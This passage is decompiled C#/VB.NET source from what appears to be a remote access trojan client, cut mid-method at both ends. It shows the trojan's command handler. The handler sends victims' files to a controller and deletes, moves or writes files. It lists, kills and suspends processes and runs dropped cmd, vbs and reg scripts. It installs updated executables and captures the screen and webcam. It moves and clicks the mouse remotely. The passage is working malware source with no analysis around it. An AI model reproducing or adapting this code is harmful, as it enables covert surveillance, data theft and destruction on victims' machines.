						string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { m }, (string[])null));
						string fileName = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { m, C }, (string[])null, true, false);
						Process.Start(fileName);
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5, num8);
						ProjectData.ClearProjectError();
					}
				}
				break;
			}
			case "#12":
			{
				ER = 1;
				object[] array5 = new object[1];
				object[] array16 = array5;
				int num3 = 1;
				array16[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array5, (string[])null));
				string text6 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				Array array17 = Strings.Split(text6, "\r\n", -1, (CompareMethod)0);
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array17, new object[1] { 3 }, (string[])null), (object)"DIR", false))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().RenameDirectory(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array17, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array17, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Conversions.ToString(NewLateBinding.LateIndexGet((object)array17, new object[1] { 2 }, (string[])null)));
				}
				else
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array17, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array17, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Conversions.ToString(NewLateBinding.LateIndexGet((object)array17, new object[1] { 2 }, (string[])null)));
				}
				break;
			}
			case "#13":
			{
				ER = 1;
				int num9 = array.Length - 1;
				for (int l = 1; l <= num9; l++)
				{
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { l }, (string[])null));
					string path4 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { l, C }, (string[])null, true, false);
					if (Directory.Exists(path4))
					{
						try
						{
							string S = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { l }, (string[])null));
							string path5 = API.DEB(ref S);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { l, S }, (string[])null, true, false);
							Directory.Delete(path5, recursive: true);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex, num8);
							ProjectData.ClearProjectError();
						}
					}
					else
					{
						try
						{
							C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { l }, (string[])null));
							string path6 = API.DEB(ref C);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { l, C }, (string[])null, true, false);
							File.Delete(path6);
						}
						catch (Exception ex2)
						{
							ProjectData.SetProjectError(ex2, num8);
							ProjectData.ClearProjectError();
						}
					}
				}
				break;
			}
			case "#14":
			{
				ER = 1;
				object[] array5 = new object[1];
				object[] array15 = array5;
				int num3 = 1;
				array15[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array5, (string[])null));
				string text5 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				FileSystem.MkDir(text5);
				break;
			}
			case "#15":
			{
				ER = 1;
				int num7 = array.Length - 1;
				for (int k = 1; k <= num7; k++)
				{
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { k }, (string[])null));
					string text3 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { k, C }, (string[])null, true, false);
					Array array12 = Strings.Split(text3, "\r\n", -1, (CompareMethod)0);
					if (Directory.Exists(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array12, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array12, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0)))
					{
						Directory.Move(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array12, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array12, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array12, new object[1] { 2 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array12, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0));
					}
					else
					{
						File.Move(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array12, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array12, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array12, new object[1] { 2 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array12, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0));
					}
				}
				break;
			}
			case "#16":
			{
				ER = 1;
				B b2 = MyProject.Forms.B;
				string text2 = "#11" + Y;
				object[] array10 = new object[1];
				object[] array11 = array10;
				int num3 = 1;
				array11[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array10, (string[])null));
				string path3 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				string S = File.ReadAllText(path3);
				string T = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(text2 + API.ENB(ref S), Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)));
				b2.SEND(ref T);
				break;
			}
			case "#17":
			{
				ER = 1;
				object[] array2 = new object[1];
				object[] array4 = array2;
				int num3 = 1;
				array4[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
				string path2 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				object[] array5 = new object[1];
				object[] array6 = array5;
				int num5 = 2;
				array6[0] = 2;
				string S = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array5, (string[])null));
				string contents = API.DEB(ref S);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, S }, (string[])null, true, false);
				File.WriteAllText(path2, contents);
				break;
			}
			case "#18":
			{
				ER = 1;
				object[] array2 = new object[1];
				object[] array3 = array2;
				int num3 = 1;
				array3[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
				string path = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				File.Create(path);
				break;
			}
			case "#19":
			{
				ER = 1;
				MemoryStream memoryStream12 = new MemoryStream();
				int num31 = Strings.InStr(@string, Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), (CompareMethod)0) + NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length + Y.Length - 1;
				int num32 = Da.Length - 1;
				for (int num33 = num31; num33 <= num32; num33++)
				{
					memoryStream12.WriteByte(Da[num33]);
				}
				object[] array2 = new object[1];
				object[] array65 = array2;
				int num3 = 1;
				array65[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
				string path16 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				byte[] byt4 = memoryStream12.ToArray();
				bool Compress = false;
				File.WriteAllBytes(path16, API.ZIP(byt4, ref Compress));
				break;
			}
			case "#20":
			{
				ER = 1;
				object[] array2 = new object[1];
				object[] array61 = array2;
				int num3 = 1;
				array61[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
				string text37 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				Array array62 = Strings.Split(text37, "\\", -1, (CompareMethod)0);
				MemoryStream memoryStream11 = new MemoryStream();
				byte[] array63 = (byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject((object)("#12" + Y), NewLateBinding.LateIndexGet((object)array62, new object[1] { array62.Length - 1 }, (string[])null)), (object)Y) }, (string[])null, (Type[])null, (bool[])null);
				memoryStream11.Write(array63, 0, array63.Length);
				array2 = new object[1];
				object[] array64 = array2;
				num3 = 1;
				array64[0] = 1;
				C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
				string path15 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				byte[] byt3 = File.ReadAllBytes(path15);
				bool Compress = true;
				array63 = API.ZIP(byt3, ref Compress);
				memoryStream11.Write(array63, 0, array63.Length);
				array63 = null;
				MyProject.Forms.B.WC.SendData(memoryStream11.ToArray());
				memoryStream11.Dispose();
				break;
			}
			case "#21":
			{
				ER = 1;
				int num29 = array.Length - 1;
				for (int num30 = 1; num30 <= num29; num30++)
				{
					Thread.Sleep(10);
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num30 }, (string[])null));
					string text34 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num30, C }, (string[])null, true, false);
					Image val7 = (Image)new Bitmap(text34);
					val7.Dispose();
					C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num30 }, (string[])null));
					string text35 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num30, C }, (string[])null, true, false);
					Array array57 = Strings.Split(text35, "\\", -1, (CompareMethod)0);
					B b23 = MyProject.Forms.B;
					string[] array31 = new string[5] { "#13", Y, null, null, null };
					string[] array58 = array31;
					object[] array5 = new object[1];
					object[] array59 = array5;
					int num3 = array57.Length - 1;
					array59[0] = num3;
					string S = Conversions.ToString(NewLateBinding.LateIndexGet((object)array57, array5, (string[])null));
					string text36 = API.ENB(ref S);
					NewLateBinding.LateIndexSetComplex((object)array57, new object[2] { num3, S }, (string[])null, true, false);
					array58[2] = text36;
					array31[3] = Y;
					string[] array60 = array31;
					C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num30 }, (string[])null));
					string path14 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num30, C }, (string[])null, true, false);
					array60[4] = API.FEN(File.ReadAllBytes(path14));
					string T = string.Concat(array31);
					b23.SEND(ref T);
				}
				break;
			}
			case "#22":
			{
				ER = 1;
				Process[] processes = Process.GetProcesses();
				string text31 = default(string);
				foreach (Process process in processes)
				{
					try
					{
						text31 = text31 + Y + process.MainModule!.ModuleName + "*" + Conversions.ToString(process.Id);
					}
					catch (Exception ex11)
					{
						ProjectData.SetProjectError(ex11, num8);
						text31 = text31 + Y + process.ProcessName + "*" + Conversions.ToString(process.Id);
						ProjectData.ClearProjectError();
					}
				}
				B b21 = MyProject.Forms.B;
				string C = "#14" + text31;
				b21.SEND(ref C);
				text31 = "";
				break;
			}
			case "#23":
			{
				ER = 1;
				int num23 = array.Length - 1;
				for (int num24 = 1; num24 <= num23; num24++)
				{
					Process.GetProcessById(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { num24 }, (string[])null))).Kill();
				}
				break;
			}
			case "#24":
			{
				try
				{
					chat.clos = true;
				}
				catch (Exception ex9)
				{
					ProjectData.SetProjectError(ex9, num8);
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(100);
				object[] array2 = new object[1];
				object[] array50 = array2;
				int num3 = 1;
				array50[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
				string cht = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				B.Cht = cht;
				break;
			}
			case "#25":
				ER = 0;
				if (((Control)B.Chat).get_InvokeRequired())
				{
					indd indd = inddd;
					object[] array2 = new object[1];
					object[] array44 = array2;
					int num3 = 1;
					array44[0] = 1;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string text24 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					string text25 = text24;
					((Control)B.Chat).Invoke((Delegate)indd, new object[1] { text25 });
				}
				else
				{
					RichTextBox t = B.Chat.T1;
					string[] array31 = new string[5]
					{
						t.get_Text(),
						MyProject.Forms.chat.nick,
						" : ",
						null,
						null
					};
					string[] array45 = array31;
					object[] array2 = new object[1];
					object[] array46 = array2;
					int num3 = 1;
					array46[0] = 1;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string text26 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					array45[3] = text26;
					array31[4] = "\r\n";
					t.set_Text(string.Concat(array31));
				}
				break;
			case "#26":
				ER = 0;
				chat.clos = true;
				break;
			case "#27":
			{
				ER = 1;
				int num21 = 0;
				string s = default(string);
				do
				{
					if (File.Exists(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num21), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)))))
					{
						try
						{
							FileSystem.Kill(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num21), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))));
							s = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num21), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
						}
						catch (Exception ex8)
						{
							ProjectData.SetProjectError(ex8, num8);
							ProjectData.ClearProjectError();
							goto IL_2ef7;
						}
					}
					else
					{
						s = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num21), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
					}
					break;
					IL_2ef7:
					num21++;
				}
				while (num21 <= 9999);
				string C;
				switch (NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.ToLower())
				{
				case "cmd":
				{
					string path13 = s;
					object[] array10 = new object[1];
					object[] array39 = array10;
					int num3 = 2;
					array39[0] = 2;
					C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array10, (string[])null));
					string contents5 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, C }, (string[])null, true, false);
					File.WriteAllText(path13, contents5);
					Interaction.Shell(s, (AppWinStyle)0, false, -1);
					break;
				}
				case "vbs":
				{
					string path12 = s;
					object[] array2 = new object[1];
					object[] array38 = array2;
					int num3 = 2;
					array38[0] = 2;
					C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string contents4 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, C }, (string[])null, true, false);
					File.WriteAllText(path12, contents4);
					Process.Start(s);
					break;
				}
				case "Reg":
				{
					string path11 = s;
					object[] array2 = new object[1];
					object[] array37 = array2;
					int num3 = 2;
					array37[0] = 2;
					C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string contents3 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, C }, (string[])null, true, false);
					File.WriteAllText(path11, contents3);
					Interaction.Shell(s, (AppWinStyle)2, false, -1);
					break;
				}
				default:
				{
					string path10 = s;
					object[] array2 = new object[1];
					object[] array36 = array2;
					int num3 = 2;
					array36[0] = 2;
					C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string contents2 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, C }, (string[])null, true, false);
					File.WriteAllText(path10, contents2);
					Process.Start(s);
					break;
				}
				}
				B b13 = MyProject.Forms.B;
				C = "#10" + Y + "^" + Conversions.ToString(4) + Y + API.ENB(ref s);
				b13.SEND(ref C);
				break;
			}
			case "#28":
			{
				ER = 1;
				object obj2 = NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
				if (Operators.ConditionalCompareObjectEqual(obj2, (object)"!", false))
				{
					B b9 = MyProject.Forms.B;
					string y = Y;
					string C = "plugin.C";
					string S = "W";
					object P = new object[0];
					string T = Conversions.ToString(global::n.C.inv(ref global::n.C.Plug, ref C, ref S, ref P));
					string T2 = "#17" + y + API.ENB(ref T);
					b9.SEND(ref T2);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"@", false))
				{
					int num11 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null));
					string S = "plugin.C";
					string T = "CW";
					object[] array5 = new object[2] { num11, null };
					object[] array21 = array5;
					object[] array2 = new object[1];
					object[] array22 = array2;
					int num3 = 3;
					array22[0] = 3;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string text8 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 3, C }, (string[])null, true, false);
					array21[1] = text8;
					object P = array5;
					global::n.C.inv(ref global::n.C.Plug, ref S, ref T, ref P);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"#", false))
				{
					object[] array2 = new object[1];
					object[] array23 = array2;
					int num3 = 2;
					array23[0] = 2;
					int num5 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					object[] array5 = new object[1];
					object[] array24 = array5;
					int q = 3;
					array24[0] = 3;
					int num6 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array5, (string[])null));
					API.wd.G(ref num5, ref num6);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 3, num6 }, (string[])null, true, false);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, num5 }, (string[])null, true, false);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"$", false))
				{
					MemoryStream memoryStream5 = new MemoryStream();
					object[] array2 = new object[1];
					object[] array25 = array2;
					int num6 = 2;
					array25[0] = 2;
					int q = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					Image obj3 = global::n.C.Capture(ref q);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, q }, (string[])null, true, false);
					obj3.Save((Stream)memoryStream5, ImageFormat.get_Jpeg());
					MemoryStream memoryStream6 = new MemoryStream();
					memoryStream6.Write(MyProject.Forms.B.WC.STB("#18" + Y), 0, MyProject.Forms.B.WC.STB("#18" + Y).Length);
					memoryStream6.Write(memoryStream5.ToArray(), 0, memoryStream5.ToArray().Length);
					MyProject.Forms.B.WC.SendData(memoryStream6.ToArray());
					memoryStream5.Dispose();
					memoryStream6.Dispose();
					MyProject.Forms.B = null;
				}
				break;
			}
			case "#29":
			{
				ER = 0;
				B b7 = MyProject.Forms.B;
				string C = "#Bla";
				b7.SEND(ref C);
				int num10 = 0;
				string text7 = default(string);
				do
				{
					if (File.Exists(Interaction.Environ("temp") + "\\" + Conversions.ToString(num10) + ".exe"))
					{
						try
						{
							File.Delete(Interaction.Environ("temp") + "\\" + Conversions.ToString(num10) + ".exe");
							text7 = Interaction.Environ("temp") + "\\" + Conversions.ToString(num10) + ".exe";
						}
						catch (Exception ex4)
						{
							ProjectData.SetProjectError(ex4, num8);
							ProjectData.ClearProjectError();
							goto IL_35a2;
						}
					}
					else
					{
						text7 = Interaction.Environ("temp") + "\\" + Conversions.ToString(num10) + ".exe";
					}
					break;
					IL_35a2:
					num10++;
				}
				while (num10 <= 999);
				string path7 = text7;
				byte[] byt = API.FDE(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
				bool Compress = false;
				File.WriteAllBytes(path7, API.ZIP(byt, ref Compress));
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = text7;
				processStartInfo.Arguments = "!0@" + Application.get_ExecutablePath() + "@" + B.SU + "@" + Conversions.ToString(Process.GetCurrentProcess().Id);
				Process.Start(processStartInfo);
				ProjectData.EndApp();
				break;
			}
			case "#30":
				try
				{
					object[] array2 = new object[1];
					object[] array18 = array2;
					int num6 = 1;
					array18[0] = 1;
					int q = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					byte[] array19 = sc.gc(ref q);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, q }, (string[])null, true, false);
					byte[] array20 = array19;
					MemoryStream memoryStream4 = new MemoryStream();
					memoryStream4.Write(Encoding.Default.GetBytes("#19" + Y), 0, Encoding.Default.GetBytes("#19" + Y).Length);
					memoryStream4.Write(array20, 0, array20.Length);
					MyProject.Forms.B.WC.SendData(memoryStream4.ToArray());
					break;
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3, num8);
					ProjectData.ClearProjectError();
					break;
				}
			case "#31":
				ER = 0;
				if (!B.Busy)
				{
					B.Busy = true;
					B b6 = MyProject.Forms.B;
					string C = "#16" + Y + Conversions.ToString(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width) + Y + Conversions.ToString(((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
					b6.SEND(ref C);
					B.Busy = false;
				}
				break;
			case "#32":
			{
				ER = 0;
				Point position = new Point(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)), Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)));
				Cursor.set_Position(position);
				object obj = NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
				if (Operators.ConditionalCompareObjectEqual(obj, (object)0, false))
				{
					mouse_event(8, 0, 0, 0, 1);
					mouse_event(16, 0, 0, 0, 1);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj, (object)1, false))
				{
					mouse_event(2, 0, 0, 0, 1);
					mouse_event(4, 0, 0, 0, 1);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj, (object)2, false))
				{
					mouse_event(2, 0, 0, 0, 1);
					mouse_event(4, 0, 0, 0, 1);
					mouse_event(2, 0, 0, 0, 1);
					mouse_event(4, 0, 0, 0, 1);
				}
				break;
			}
			case "#33":
			{
				B b3 = MyProject.Forms.B;
				string C = "#5" + Y + API.Gt();
				b3.SEND(ref C);
				break;
			}
			case "#34":
			{
				ER = 0;
				object[] array2 = new object[1];
				object[] array7 = array2;
				int num6 = 1;
				array7[0] = 1;
				int q = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
				byte[] array8 = global::n.C.Capture1(ref q);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, q }, (string[])null, true, false);
				byte[] array9 = array8;
				if (array9.Length != 0)
				{
					MemoryStream memoryStream3 = new MemoryStream();
					memoryStream3.Write(Encoding.Default.GetBytes("#6" + Y), 0, Y.Length + 2);
					memoryStream3.Write(array9, 0, array9.Length);
					MyProject.Forms.B.WC.SendData(memoryStream3.ToArray());
				}
				break;
			}
			case "#35":
			{
				int num4 = array.Length - 1;
				for (int j = 1; j <= num4; j++)
				{
					NTSuspendProcess.SuspendProcess(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { j }, (string[])null)));
				}
				break;
			}
			case "#36":
			{
				int num2 = array.Length - 1;
				for (int i = 1; i <= num2; i++)
				{
					NTSuspendProcess.ResumeProcess(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { i }, (string[])null)));
				}
				break;
			}
			case "#37":
			{
				CamLoad();
				byte[] cam = Resources.Cam;
				bool Compress = false;
				byte[] F = API.ZIP(cam, ref Compress);
				string C = "Cam.Cam";
				string S = "Dnames";
				object P = null;
				string text = Conversions.ToString(global::n.C.inv(ref F, ref C, ref S, ref P));
				B b = MyProject.Forms.B;
				C = "#22" + Y + text;
				b.SEND(ref C);
				break;
			}
			case "#38":
			{
				CamLoad();
				int num = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
				string C = "Cam.Cam";
				string S = "Cam";
				object P = new object[3]
				{
					num,
					RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)),
					RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null))
				};
				Image val = (Image)global::n.C.inv(ref cdll, ref C, ref S, ref P);
				MemoryStream memoryStream = new MemoryStream();
				val.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				MemoryStream memoryStream2 = new MemoryStream();
				memoryStream2.Write(MyProject.Forms.B.WC.STB("#23" + Y), 0, MyProject.Forms.B.WC.STB("#23" + Y).Length);
				memoryStream2.Write(memoryStream.ToArray(), 0, memoryStream.ToArray().Length);
				MyProject.Forms.B.WC.SendData(memoryStream2.ToArray());
				break;
			}
			}
		}
		catch (Exception ex23)
		{
			ProjectData.SetProjectError(ex23, num8);
			Exception ex24 = ex23;
			B.Busy = false;
			B b25 = MyProject.Forms.B;
			string[] array31 = new string[6]
			{
				"#10",
				Y,
				"^",
				Conversions.ToString(ER),
				Y,
				null
			};
			string[] array71 = array31;
			string C = ex24.Message;
			array71[5] = API.ENB(ref C);
			string S = string.Concat(array31);
			b25.SEND(ref S);
			ER = 0;
			ProjectData.ClearProjectError();
		}
	}

	public static void CamLoad()
	{
		if (!File.Exists(Application.get_StartupPath() + "\\DShowNet.dll"))
		{
			string path = Application.get_StartupPath() + "\\DShowNet.dll";
			byte[] dShowNET = Resources.DShowNET;
			bool Compress = false;
			File.WriteAllBytes(path, API.ZIP(dShowNET, ref Compress));
		}
		if (!File.Exists(Application.get_StartupPath() + "\\DirectX.Capture.dll"))
		{
			string path2 = Application.get_StartupPath() + "\\DirectX.Capture.dll";
			byte[] directX = Resources.DirectX;
			bool Compress = false;
			File.WriteAllBytes(path2, API.ZIP(directX, ref Compress));
		}
	}

	public static string siz(string Size)
	{
		if (Size.Length < 4)
		{
			return Size + " Bytes";
		}
		string text = Conversions.ToString(Conversions.ToDouble(Size) / 1024.0);
		string text2 = " KB";
		int num = default(int);
		if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
		{
			Array array = Strings.Split(text, ".", -1, (CompareMethod)0);
			text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null));
			num = ((NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), 1, 3)));
		}
		if (text.Length > 3)
		{
			text = Conversions.ToString(Conversions.ToDouble(text) / 1024.0);
			text2 = " MB";
			if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
			{
				Array array2 = Strings.Split(text, ".", -1, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null));
				num = ((NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null)), 1, 3)));
			}
		}
		if (text.Length > 3)
		{
			text = Conversions.ToString(Conversions.ToDouble(text) / 1024.0);
			text2 = " GB";
			if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
			{
				Array array3 = Strings.Split(text, ".", -1, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 0 }, (string[])null));
				num = ((NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null)), 1, 3)));
			}
		}
		return text + "." + Conversions.ToString(num) + text2;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	public static byte[] SB(ref string s, ref byte[] B)
	{
		MemoryStream memoryStream = new MemoryStream();
		byte[] bytes = Encoding.Default.GetBytes(s);
		memoryStream.Write(bytes, 0, bytes.Length);
		byte[] byt = B;
		bool Compress = true;
		byte[] array = API.ZIP(byt, ref Compress);
		memoryStream.Write(array, 0, array.Length);
		return memoryStream.ToArray();
	}

	public static string _P(ref int y)
	{
		pk = "";
		int num = y;
		for (int i = 0; i <= num; i++)
		{
			pk += "A";
		}
		return pk;
	}

	public static void Du(Array z)
	{
		byte[] array = new byte[0];
